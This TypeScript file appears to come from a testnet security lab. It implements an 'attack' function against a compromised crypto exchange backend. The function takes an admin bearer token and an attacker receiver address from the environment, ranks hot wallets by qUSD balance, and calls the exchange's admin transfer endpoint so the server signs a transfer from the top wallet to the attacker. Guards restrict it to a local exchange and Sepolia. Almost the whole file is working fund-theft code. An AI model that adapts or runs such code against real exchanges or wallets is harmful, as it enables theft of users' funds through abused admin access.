// Asks the exchange API to sign a 1 qUSD probe. The key stays on that server. Testnet only.

import { loadDeployment } from '@quorum/shared/deployments'
import type { Address } from 'viem'
import { assertLocalExchange, assertSepoliaTarget } from './guard'
import { select } from './scanner'

const ONE_QUSD = '1000000'

function need(name: string): string {
  const v = process.env[name]
  if (!v) throw new Error(`missing env ${name}`)
  return v
}

function asAddress(raw: string, name: string): Address {
  if (!/^0x[0-9a-fA-F]{40}$/.test(raw)) throw new Error(`${name} is not an address`)
  return raw as Address
}

/** Sign one probe through the compromised backend. Callers pass an address they already ranked. */
export async function probeTransfer(baseUrl: string, adminToken: string, address: string, to: string): Promise<string> {
  const url = assertLocalExchange(baseUrl)
  const res = await fetch(new URL('/admin/hot-wallets/transfer', url), {
    method: 'POST',
    headers: { authorization: `Bearer ${adminToken}`, 'content-type': 'application/json' },
    body: JSON.stringify({ address, to, amount: ONE_QUSD }),
  })
  const body: unknown = await res.json().catch(() => null)
  if (!res.ok) {
    const message =
      body && typeof body === 'object' && 'error' in body && typeof body.error === 'string' ? body.error : res.status
    throw new Error(`transfer failed ${message}`)
  }
  const tx = body && typeof body === 'object' && 'tx' in body ? body.tx : undefined
  if (typeof tx !== 'string' || !/^0x[0-9a-fA-F]{64}$/.test(tx)) throw new Error('transfer response has no tx')
  return tx
}

export async function attack(): Promise<string> {
  const baseUrl = need('EXCHANGE_API_URL')
  const adminToken = need('ADMIN_TOKEN')
  const rpc = need('RPC_URL')
  const receiver = asAddress(need('ATTACKER_RECEIVER'), 'ATTACKER_RECEIVER')
  const deployment = loadDeployment()
  assertSepoliaTarget(deployment.chainId, rpc)

  const target = await select(baseUrl, adminToken)
  const hash = await probeTransfer(baseUrl, adminToken, target.address, receiver)
  return [
    `selected ${target.address}`,
    'rank 1',
    'reason eoa with qUSD balance at or above 1, highest balance first',
    `amount ${ONE_QUSD}`,
    `token ${deployment.qUSD}`,
    `to ${receiver}`,
    `chainId ${deployment.chainId}`,
    'signed by exchange-api',
    `tx ${hash}`,
  ].join('\n')
}
